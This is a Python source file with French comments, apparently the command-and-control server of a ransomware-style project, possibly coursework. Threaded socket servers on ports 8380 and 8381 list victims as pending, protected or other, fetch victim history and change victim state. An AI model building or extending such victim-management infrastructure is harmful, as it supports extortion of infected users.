import queue
import threading
import utile.data as data
import utile.message as message
import utile.network as net

THREADS_QUEUE = {'CONTROLE': '', 'FRONTAL': ''}


# Lancement du serveur clé écoutant (de base) en local sur le port 8380
def Console_Controle(FIFO_message_type):
    socket_serv = net.start_net_serv_client()
    FIFO_resp = queue.Queue()
    THREADS_QUEUE['CONTROLE'] = FIFO_resp
    while True:
        conn, addr = socket_serv.accept()
        print(
            f'[+] CONSOLE CONTROLE | Connexion établie depuis {addr[0]}:{addr[1]} sur l\'adresse '
            f'{conn.getsockname()[0]}:{conn.getsockname()[1]}\n')
        while True:
            try:
                recv_data = net.receive_message(conn)
                FIFO_message_type.put([recv_data, 'CONTROLE'])
            except:
                conn.close()
                print('[+] Déconnexion de la Console_Controle')
                break
            while True:
                packet = FIFO_resp.get()
                FIFO_resp.task_done()
                net.send_message(conn, packet)
                if message.get_message_type(packet) == 'HISTORY_END' or message.get_message_type(
                        packet) == 'LIST_VICTIM_END':
                    break


def Serveur_Frontal(FIFO_message_type):
    socket_serv = net.start_net_serv_client(port=8381)
    FIFO_resp = queue.Queue()
    THREADS_QUEUE['FRONTAL'] = FIFO_resp
    while True:
        conn, addr = socket_serv.accept()
        print(
            f'[+] SERVEUR FRONTAL | Connexion établie depuis {addr[0]}:{addr[1]} sur l\'adresse '
            f'{conn.getsockname()[0]}:{conn.getsockname()[1]}\n')
        recv_data = net.receive_message(conn)

        FIFO_message_type.put([recv_data, 'FRONTAL'])
        """    while True:
                print('oui')
                if FIFO_resp.empty():
                    continue
                elif not FIFO_resp.empty():
                    print('Dedans?')
                    net.send_message(conn, FIFO_resp.get())"""
        while True:
            packet = FIFO_resp.get()
            FIFO_resp.task_done()
            net.send_message(conn, packet)
            if message.get_message_type(packet) == 'HISTORY_END' or message.get_message_type(
                    packet) == 'LIST_VICTIM_END':
                break


def ThreadMaster(FIFO_message_type):
    while True:
        recv_data, id_thread = FIFO_message_type.get()
        FIFO_resp = THREADS_QUEUE[id_thread]
        message_type = message.get_message_type(recv_data)
        if message_type == 'LIST_VICTIM_REQ':
            # execution de la fonction get_victim_list() pour plus d'informations -> voir data.py
            result_pending, result_protected, result_other = data.get_victim_list()

            # Pour chaque victime, l'envoie vers le client
            for victim in result_pending:
                list_victim_resp1 = message.set_message("LIST_VICTIM_RESP", victim)
                FIFO_resp.put(list_victim_resp1)
                FIFO_resp.join()

            for victim in result_protected:
                list_victim_resp2 = message.set_message("LIST_VICTIM_RESP", victim)
                FIFO_resp.put(list_victim_resp2)
                FIFO_resp.join()

            for victim in result_other:
                list_victim_resp3 = message.set_message("LIST_VICTIM_RESP", victim)
                FIFO_resp.put(list_victim_resp3)
                FIFO_resp.join()

            # envoie d'un LIST_VICTIM_END pour indiquer la fin
            list_victim_end = message.set_message("LIST_VICTIM_END")
            FIFO_resp.put(list_victim_end)
            FIFO_resp.join()

        elif message_type == 'HISTORY_REQ':
            # Execution de la fonction get_history() pour plus d'informations -> voir data.py
            result = data.get_history(recv_data)
            # Envoi du résultat
            history_resp = message.set_message('HISTORY_RESP', result[0])
            history_end = message.set_message('HISTORY_END', [recv_data['HIST_REQ']])
            FIFO_resp.put(history_resp)
            FIFO_resp.put(history_end)
            FIFO_resp.join()

        elif message_type == 'CHANGE_STATE':
            data.change_state(recv_data)

        elif message_type == 'INITIALIZE':
            pass


def main():
    FIFO_message_type = queue.Queue()

    # création des threads
    Serveur_Frontal_thread = threading.Thread(target=Serveur_Frontal, args=(FIFO_message_type,))
    Console_Controle_thread = threading.Thread(target=Console_Controle, args=(FIFO_message_type,))

    # Lancement des threads
    Console_Controle_thread.start()
    Serveur_Frontal_thread.start()

    # Lancement du threadMaster
    ThreadMaster(FIFO_message_type)


if __name__ == '__main__':
    main()
